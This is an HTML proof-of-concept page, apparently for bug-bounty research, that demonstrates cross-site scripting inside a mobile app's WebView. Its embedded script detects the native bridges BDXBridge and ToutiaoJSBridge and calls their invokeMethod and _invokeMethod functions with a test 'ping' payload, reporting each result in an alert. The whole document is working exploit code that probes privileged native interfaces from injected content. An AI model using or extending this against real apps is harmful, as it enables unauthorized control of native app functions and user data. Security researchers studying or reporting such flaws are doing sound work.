<!doctype html>
<html>
  <body>
    <h1>GAUTH XSS POC</h1>
    <p>If you see this inside the app, JS is running in the WebView.</p>

    <script>
      alert("WebView controlled");

      setTimeout(function () {
        var msg = [];

        if (window.BDXBridge) msg.push("BDXBridge");
        if (window.ToutiaoJSBridge) msg.push("ToutiaoJSBridge");

        alert("Available bridges: " + (msg.join(", ") || "none"));

        // Try calling invokeMethod / _invokeMethod with a harmless payload
        try {
          var payload = JSON.stringify({
            func: "ping",
            params: { from: "gauth-xss-poc" },
            __msg_type: "call",
            __callback_id: "9999"
          });

          if (window.ToutiaoJSBridge && ToutiaoJSBridge.invokeMethod) {
            ToutiaoJSBridge.invokeMethod(payload);
            alert("Called ToutiaoJSBridge.invokeMethod(ping)");
          } else if (window.BDXBridge && BDXBridge._invokeMethod) {
            BDXBridge._invokeMethod(payload);
            alert("Called BDXBridge._invokeMethod(ping)");
          }
        } catch (e) {
          alert("Bridge call error: " + e);
        }
      }, 2000);
    </script>
  </body>
</html>
